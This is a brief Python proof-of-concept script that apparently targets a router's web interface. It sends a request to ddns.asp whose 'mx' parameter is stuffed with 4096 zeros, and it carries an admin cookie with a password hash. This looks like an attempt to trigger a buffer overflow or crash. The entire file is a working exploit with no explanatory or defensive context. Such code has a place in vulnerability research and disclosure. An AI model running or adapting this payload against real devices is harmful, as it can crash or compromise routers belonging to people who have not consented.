import requests
url="http://192.168.0.1/ddns.asp?opt=add&mx="+'0'*0x1000
headers={"cookie":"wys_userid=admin,wys_passwd=520E1BFD4CDE217D0A5824AE7EA60632"}
response=requests.get(url=url,headers=headers)
print(response.text)